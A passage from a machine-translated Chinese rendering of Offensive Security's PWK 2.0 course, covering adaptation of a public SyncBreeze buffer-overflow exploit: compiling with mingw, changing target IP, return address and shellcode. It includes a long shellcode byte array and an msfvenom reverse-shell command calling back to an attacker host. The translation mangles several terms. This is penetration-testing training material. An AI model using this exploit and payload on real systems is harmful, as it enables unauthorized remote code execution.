<div style="position:absolute;top:20243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">383 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2015 年），https://forums.offensive-security.com/showthread.php?t=2206&amp;p=8529</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">459</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0xdd)：对`_imp__htons@4'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x106): 对`_imp__connect@12'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x14f)：对`_imp__send@16'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp:syncbreeze_exploit.c:(.text+0x182): 对`_imp__closesocket@4'的未定义引用</font></font></nobr></div>
<div style="position:absolute;top:20568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">collect2: 错误: ld 返回 1 个退出状态</font></font></nobr></div>
<div style="position:absolute;top:20587;left:216"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 431 - 尝试使用 mingw-64 编译漏洞后显示的错误</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译过程中出了点问题，尽管清单 431 中的错误</font></font></nobr></div>
<div style="position:absolute;top:20636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能看起来很陌生，简单的谷歌搜索“WSAStartup”就会发现这是一个在</font></font></nobr></div>
<div style="position:absolute;top:20655;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WINSOCK.H</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">进一步的研究表明，当链接器找不到</font></font></nobr></div>
<div style="position:absolute;top:20674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winsock 库，并将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-lws2_32</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">添加</font><font style="vertical-align: inherit;">到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc</font></font></font></b></nobr></div>
<div style="position:absolute;top:20693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令应该可以解决问题：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</font></font></font></b></nobr></div>
<div style="position:absolute;top:20762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah</font></font></font></b></nobr></div>
<div style="position:absolute;top:20779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 372K</font></font></nobr></div>
<div style="position:absolute;top:20796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 根 4.0K 二月 24 日 17:13。</font></font></nobr></div>
<div style="position:absolute;top:20813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 17 根 4.0K 2 月 24 日 15:42 ..</font></font></nobr></div>
<div style="position:absolute;top:20830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 4.7K 2 月 24 日 15:46 42341.c</font></font></nobr></div>
<div style="position:absolute;top:20847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 root root 355K Feb 24 17:13 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">syncbreeze_exploit.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:20866;left:139"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 432 - 调整 mingw-64 命令链接 winsock 库后成功编译代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 432 显示 mingw32 生成了一个可执行文件而不生成任何编译</font></font></nobr></div>
<div style="position:absolute;top:20915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Kali Linux 中的 searchsploit 工具定位本节中讨论的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:21008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在 Kali Linux 中安装 mingw-w64 套件并编译漏洞利用代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21043;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.4</font></font></i></nobr></div>
<div style="position:absolute;top:21043;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改套接字信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经知道这个漏洞利用目标是一个远程可访问的漏洞，这意味着我们的</font></font></nobr></div>
<div style="position:absolute;top:21100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码需要在某个时刻与目标建立连接。</font></font></nobr></div>
<div style="position:absolute;top:21133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查 C 代码，我们注意到它使用硬编码的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 地址</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值</font><font style="vertical-align: inherit;">以及 for</font></font></nobr></div>
<div style="position:absolute;top:21152;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("[&gt;] 套接字已创建。\n");</font></font></nobr></div>
<div style="position:absolute;top:21204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_addr.s_addr = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet_addr</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (" </font><b><font color="#c00000"><font style="vertical-align: inherit;">10.11.0.22</font></font></b><font style="vertical-align: inherit;"> ");</font></font></nobr></div>
<div style="position:absolute;top:21221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_family = AF_INET;</font></font></nobr></div>
<div style="position:absolute;top:21238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_port = htons( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> );</font></font></nobr></div>
<div style="position:absolute;top:21257;left:237"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 433 - 识别负责 IP 地址和端口的代码行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些将是我们需要在我们的漏洞利用中调整的第一个值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21321;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 修改exploit中的连接信息以针对SyncBreeze</font></font></nobr></div>
<div style="position:absolute;top:21370;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的 Windows 客户端上安装。</font></font></nobr></div>
<div style="position:absolute;top:21399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.重新编译exploit，使用Wireshark确认代码成功启动</font></font></nobr></div>
<div style="position:absolute;top:21418;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到您的专用 Windows 客户端的套接字连接。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">460</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21688;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.5</font></font></i></nobr></div>
<div style="position:absolute;top:21688;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改退货地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对代码的进一步检查显示使用了位于 msvbvm60.dll 中的返回地址，它</font></font></nobr></div>
<div style="position:absolute;top:21745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是易受攻击的软件的一部分。</font><font style="vertical-align: inherit;">在我们的调试器中查看加载的模块</font></font></nobr></div>
<div style="position:absolute;top:21764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 客户端，我们注意到这个 DLL 不存在，这意味着返回地址将无效</font></font></nobr></div>
<div style="position:absolute;top:21784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们的目标。</font></font></nobr></div>
<div style="position:absolute;top:21817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于我们已经从之前的模块中获得了一个有效的漏洞利用，我们可以替换目标</font></font></nobr></div>
<div style="position:absolute;top:21836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用我们自己的返回地址，这是有效的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 retn[] = "\x83\x0c\x09\x10"; </font><font style="vertical-align: inherit;">// 0x10090c83</font></font></nobr></div>
<div style="position:absolute;top:21890;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 434 - 更改退货地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们没有先前开发的漏洞的返回地址，我们有几个选择。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:21939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个也是最推荐的选项是在本地重新创建目标环境并使用</font></font></nobr></div>
<div style="position:absolute;top:21958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器来确定这个地址。</font><font style="vertical-align: inherit;">这是我们开发原版时使用的流程</font></font></nobr></div>
<div style="position:absolute;top:21978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发。</font></font></nobr></div>
<div style="position:absolute;top:22010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果这不是一个选项，那么我们可以使用来自其他公开可用漏洞的信息来获取</font></font></nobr></div>
<div style="position:absolute;top:22030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们的目标环境相匹配的可靠返回地址。</font><font style="vertical-align: inherit;">例如，如果我们需要退货</font></font></nobr></div>
<div style="position:absolute;top:22049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2003 SP2 上 JMP ESP 指令的地址，我们可以在公共场合查找</font></font></nobr></div>
<div style="position:absolute;top:22068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用针对该操作系统的不同漏洞的漏洞利用。</font><font style="vertical-align: inherit;">这个方法比较少</font></font></nobr></div>
<div style="position:absolute;top:22088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可靠，并且可能因操作系统安装的保护而有很大差异。</font></font></nobr></div>
<div style="position:absolute;top:22121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为替代方案，我们可以直接从目标机器获取返回地址。</font><font style="vertical-align: inherit;">如果我们有</font></font></nobr></div>
<div style="position:absolute;top:22140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以非特权用户身份访问我们的目标，并希望运行一个漏洞利用程序来提升我们的</font></font></nobr></div>
<div style="position:absolute;top:22159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，我们可以将我们感兴趣的 DLL 复制到我们的攻击机中并使用各种</font></font></nobr></div>
<div style="position:absolute;top:22179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架中的</font><font style="vertical-align: inherit;">反汇编器甚至</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfpescan </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">384</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等工具</font><font style="vertical-align: inherit;">来获取</font></font></nobr></div>
<div style="position:absolute;top:22198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可靠的退货地址。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22232;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 找到任何有效的返回地址指令并更改原始漏洞利用中存在的指令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22297;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.6</font></font></i></nobr></div>
<div style="position:absolute;top:22297;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改变有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续分析我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用，我们注意到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量似乎持有</font></font></nobr></div>
<div style="position:absolute;top:22354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷。</font><font style="vertical-align: inherit;">由于它存储为十六进制字节，我们无法轻易确定其用途。</font><font style="vertical-align: inherit;">给出的唯一提示</font></font></nobr></div>
<div style="position:absolute;top:22374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者引用了</font><font style="vertical-align: inherit;">作为</font><i><font style="vertical-align: inherit;">shellcode</font></i><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">一部分的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOP 幻灯片</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 shellcode[] = </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:22426;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP 幻灯片</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22442;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xdb\xda\xbd\x92\xbc\xaf\xa7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"</font></font></nobr></div>
<div style="position:absolute;top:22459;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x31\x68\x17\x83\xc0\x04\x03\xfa\xaf\x4d\x52\x06\x27\x13"</font></font></nobr></div>
<div style="position:absolute;top:22476;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x9d\xf6\xb8\x74\x17\x13\x89\xb4\x43\x50\xba\x04\x07\x34\x37"</font></font></nobr></div>
<div style="position:absolute;top:22493;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xee\x45\xac\xcc\x82\x41\xc3\x65\x28\xb4\xea\x76\x01\x84\x6d"</font></font></nobr></div>
<div style="position:absolute;top:22510;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf5\x58\xd9\x4d\xc4\x92\x2c\x8c\x01\xce\xdd\xdc\xda\x84\x70"</font></font></nobr></div>
<div style="position:absolute;top:22527;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf0\x6f\xd0\x48\x7b\x23\xf4\xc8\x98\xf4\xf7\xf9\x0f\x8e\xa1"</font></font></nobr></div>
<div style="position:absolute;top:22544;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd9\xae\x43\xda\x53\xa8\x80\xe7\x2a\x43\x72\x93\xac\x85\x4a"</font></font></nobr></div>
<div style="position:absolute;top:22561;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5c\x02\xe8\x62\xaf\x5a\x2d\x44\x50\x29\x47\xb6\xed\x2a\x9c"</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:22619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">384 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com/metasploit-unleashed/exploit-targets/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">461</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22876;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xc4\x29\xbe\x06\x6e\xb9\x18\xe2\x8e\x6e\xfe\x61\x9c\xdb\x74"</font></font></nobr></div>
<div style="position:absolute;top:22892;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x2d\x81\xda\x59\x46\xbd\x57\x5c\x88\x37\x23\x7b\x0c\x13\xf7"</font></font></nobr></div>
<div style="position:absolute;top:22909;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe2\x15\xf9\x56\x1a\x45\xa2\x07\xbe\x0e\x4f\x53\xb3\x4d\x18"</font></font></nobr></div>
<div style="position:absolute;top:22926;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x90\xfe\x6d\xd8\xbe\x89\x1e\xea\x61\x22\x88\x46\xe9\xec\x4f"</font></font></nobr></div>
<div style="position:absolute;top:22944;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xa8\xc0\x49\xdf\x57\xeb\xa9\xf6\x93\xbf\xf9\x60\x35\xc0\x91"</font></font></nobr></div>
<div style="position:absolute;top:22960;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x70\xba\x15\x35\x20\x14\xc6\xf6\x90\xd4\xb6\x9e\xfa\xda\xe9"</font></font></nobr></div>
<div style="position:absolute;top:22977;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbf\x05\x31\x82\x2a\xfc\xd2\x01\xba\x8a\xef\x32\xb9\x72\xe1"</font></font></nobr></div>
<div style="position:absolute;top:22994;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x9e\x34\x94\x6b\x0f\x11\x0f\x04\xb6\x38\xdb\xb5\x37\x97\xa6"</font></font></nobr></div>
<div style="position:absolute;top:23011;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf6\xbc\x14\x57\xb8\x34\x50\x4b\x2d\xb5\x2f\x31\xf8\xca\x85"</font></font></nobr></div>
<div style="position:absolute;top:23028;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5d\x66\x58\x42\x9d\xe1\x41\xdd\xca\xa6\xb4\x14\x9e\x5a\xee"</font></font></nobr></div>
<div style="position:absolute;top:23045;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8e\xbc\xa6\x76\xe8\x04\x7d\x4b\xf7\x85\xf0\xf7\xd3\x95\xcc"</font></font></nobr></div>
<div style="position:absolute;top:23062;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf8\x5f\xc1\x80\xae\x09\xbf\x66\x19\xf8\x69\x31\xf6\x52\xfd"</font></font></nobr></div>
<div style="position:absolute;top:23079;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xc4\x34\x65\x7b\xc9\x10\x13\x63\x78\xcd\x62\x9c\xb5\x99\x62"</font></font></nobr></div>
<div style="position:absolute;top:23096;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe5\xab\x39\x8c\x3c\x68\x59\x6f\x94\x85\xf2\x36\x7d\x24\x9f"</font></font></nobr></div>
<div style="position:absolute;top:23113;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xc8\xa8\x6b\xa6\x4a\x58\x14\x5d\x52\x29\x11\x19\xd4\xc2\x6b"</font></font></nobr></div>
<div style="position:absolute;top:23130;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x32\xb1\xe4\xd8\x33\x90";</font></font></nobr></div>
<div style="position:absolute;top:23150;left:199"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 435 - shellcode 变量内容在实际负载之前包含一个 NOP 幻灯片</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们已经在之前的漏洞利用研究中确定了不良字符，因此我们</font></font></nobr></div>
<div style="position:absolute;top:23198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成我们自己的有效载荷</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23250;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">thread -fc –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 11 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:23284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 1 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:23301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 351（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:23318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 选择最终尺寸 351</font></font></nobr></div>
<div style="position:absolute;top:23335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：351 字节</font></font></nobr></div>
